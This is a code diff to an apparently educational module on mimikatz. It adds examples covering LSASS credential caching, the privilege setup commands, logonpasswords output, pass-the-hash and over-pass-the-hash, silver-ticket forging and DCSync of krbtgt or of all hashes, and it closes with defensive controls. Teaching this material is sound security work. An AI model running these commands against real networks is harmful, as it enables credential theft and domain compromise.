@@ -41,14 +41,10 @@ MODULE = {
             'title': 'What mimikatz reads, and why it is there to read',
             'next': 'mk-running',
             'concept': (
-                'Windows does not ask for your password every time you reach a '
-                'file share or a service; that is single sign-on, and it works '
-                'because Windows keeps your credential material in memory after '
-                'you log in. The process that holds it is LSASS, the Local '
-                'Security Authority Subsystem Service, and what it holds is '
-                'more than you might hope: your NTLM password hash, your '
-                'Kerberos tickets, and on older or misconfigured systems your '
-                'password in plaintext.\n\n'
+                'mimikatz is how you read credential material that Windows '
+                'cached in LSASS for single sign-on. That is why a local '
+                'administrator on a shared workstation can recover the hashes '
+                'and tickets of everyone who has logged in since boot.\n\n'
                 'mimikatz reads LSASS memory and pulls all of that out. That is '
                 'the whole tool in one sentence, and the consequence is the '
                 'thing to internalise: **whoever is local administrator on a '
@@ -68,7 +64,9 @@ MODULE = {
                 'Everything after this is the specific mechanisms: what forms '
                 'the credential takes, how the hash alone is enough, and how '
                 'Kerberos tickets can be forged. Hold the one idea and the rest '
-                'is detail.'
+                'is detail.\n\n'
+                'The next question is what it takes to read LSASS at all, and '
+                'why the famous binary so often never gets that far.'
             ),
             'examples': [
                 {
@@ -82,6 +80,13 @@ MODULE = {
                              'local admin -> read LSASS -> all of the above'),
                     'note': 'Single sign-on is why it is cached. mimikatz is '
                             'how it is read.',
+                },
+                {
+                    'label': 'Still there after they log out',
+                    'code': ('08:00  domain admin logs into the helpdesk PC\n'
+                             '08:05  they log out. LSASS keeps the hash\n'
+                             '14:00  local admin reads LSASS. hash still there'),
+                    'note': 'Reboot is what clears it. Logging out is not.',
                 },
             ],
             'misconceptions': [
@@ -105,10 +110,10 @@ MODULE = {
             'title': 'Running it: privilege, and why it rarely just works',
             'next': 'mk-sekurlsa',
             'concept': (
-                'mimikatz speaks in `module::command` pairs, so '
-                '`sekurlsa::logonpasswords` runs the logonpasswords command of '
-                'the sekurlsa module. You will type dozens of those, and the '
-                'first two are always the same setup.\n\n'
+                '`privilege::debug` and `token::elevate` are how you open '
+                'LSASS to mimikatz. That is why the first two lines of every '
+                'session are the same, and why the official binary from disk '
+                'on a patched host is usually gone before the prompt.\n\n'
                 'To read LSASS you need to be local administrator and you need '
                 'the debug privilege, which lets a process touch another '
                 'process\'s memory. `privilege::debug` enables it, and it '
@@ -141,6 +146,17 @@ MODULE = {
                              'then:  sekurlsa::logonpasswords'),
                     'note': 'privilege::debug then token::elevate is the '
                             'standard preamble to reading LSASS.',
+                },
+                {
+                    'label': 'When the first line is not OK',
+                    'code': ('privilege::debug\n'
+                             '  ... OK          local admin, debug on\n'
+                             '  ERROR ...       not admin; LSASS stays closed\n'
+                             '\n'
+                             'mimikatz.exe from disk on a patched host\n'
+                             '  gone before the prompt appears'),
+                    'note': 'Without OK, later commands come back empty. On a '
+                            'defended host the binary often never starts.',
                 },
             ],
             'misconceptions': [
@@ -202,6 +218,17 @@ MODULE = {
                     'note': 'minidump reads a dumped LSASS offline, which is '
                             'how the harvest and the analysis get separated.',
                 },
+                {
+                    'label': 'Hashes versus plaintext',
+                    'code': ('sekurlsa::logonpasswords\n'
+                             '  Username : alice\n'
+                             '  Domain   : CORP\n'
+                             '  NTLM     : <hash>        present either way\n'
+                             '  Password : (null)        WDigest off, default\n'
+                             '  Password : Summer2024    WDigest on'),
+                    'note': 'A null password is expected. Plaintext means '
+                            'WDigest is enabled, which is itself the finding.',
+                },
             ],
             'misconceptions': [
                 'Finding plaintext passwords is not guaranteed. On modern '
@@ -225,12 +252,10 @@ MODULE = {
             'title': 'Pass-the-hash: the hash is the credential',
             'next': 'mk-tickets',
             'concept': (
-                'Here is the fact that makes the NTLM hash so dangerous: for '
-                'NTLM authentication, you never need the plaintext password, '
-                'because the protocol proves you know the password by using its '
-                'hash. So possessing the hash is exactly as good as possessing '
-                'the password. You do not crack it; you use it directly. That '
-                'is **pass-the-hash**.\n\n'
+                '`sekurlsa::pth` is how you start a process whose network '
+                'authentication uses an NTLM hash you already have. That is '
+                'why the hash is the credential for NTLM, and why nothing '
+                'needs cracking before you use it. That is **pass-the-hash**.\n\n'
                 '`sekurlsa::pth` does it: given a username, a domain and an '
                 'NTLM hash, it starts a new process whose network '
                 'authentication will use that hash, so anything that process '
@@ -261,6 +286,16 @@ MODULE = {
                              '     using only their hash'),
                     'note': 'No plaintext involved. For NTLM, the hash proves '
                             'you know the password, so it is the password.',
+                },
+                {
+                    'label': 'Over-pass-the-hash, Kerberos instead',
+                    'code': ('sekurlsa::pth /user:Administrator /domain:corp\n'
+                             '  /aes256:<key> /run:cmd.exe\n'
+                             '\n'
+                             '  -> a TGT is requested from the key,\n'
+                             '     then ordinary Kerberos tickets follow'),
+                    'note': 'Same command, AES key rather than NTLM. The '
+                            'traffic looks like a normal Kerberos logon.',
                 },
             ],
             'misconceptions': [
@@ -326,6 +361,18 @@ MODULE = {
                     'note': 'The krbtgt hash makes it possible; /ptt injects it '
                             'into the current session. The DC was never asked.',
                 },
+                {
+                    'label': 'A silver ticket, one service only',
+                    'code': ('kerberos::golden /user:Administrator\n'
+                             '  /domain:corp.local /sid:S-1-5-21-...\n'
+                             '  /target:filesrv.corp.local /service:cifs\n'
+                             '  /rc4:<service hash> /ptt\n'
+                             '\n'
+                             '  -> a forged TGS for that share only,\n'
+                             '     the DC is never contacted'),
+                    'note': 'Same command as a golden ticket. /service and '
+                            '/target, plus a service hash, make it silver.',
+                },
             ],
             'misconceptions': [
                 'A golden ticket is forged, not requested, so the domain '
@@ -390,6 +437,16 @@ MODULE = {
                     'note': 'DCSync gets krbtgt from anywhere with the right '
                             'privilege. The sam and secrets commands read a '
                             'machine you already hold.',
+                },
+                {
+                    'label': 'One account, or every hash the DC will give',
+                    'code': ('lsadump::dcsync /user:krbtgt\n'
+                             '  one hash, enough for a golden ticket\n'
+                             '\n'
+                             'lsadump::dcsync /all\n'
+                             '  every hash the DC will replicate'),
+                    'note': 'Same replication, bigger ask. /user is enough '
+                            'for a golden ticket; /all is a full dump.',
                 },
             ],
             'misconceptions': [
@@ -459,6 +516,17 @@ MODULE = {
                     'note': 'Credential Guard makes logonpasswords empty; LAPS '
                             'makes a dumped local hash useless elsewhere; '
                             'Sysmon 10 catches the dump.',
+                },
+                {
+                    'label': 'What still works when one control is on',
+                    'code': ('Credential Guard on:\n'
+                             '  sekurlsa::logonpasswords   empty\n'
+                             '  lsadump::dcsync            still works\n'
+                             '\n'
+                             'LAPS on, local hash dumped:\n'
+                             '  that hash opens this host only'),
+                    'note': 'Credential Guard stops the local read. DCSync is '
+                            'replication, not LSASS, so it is a different path.',
                 },
             ],
             'misconceptions': [
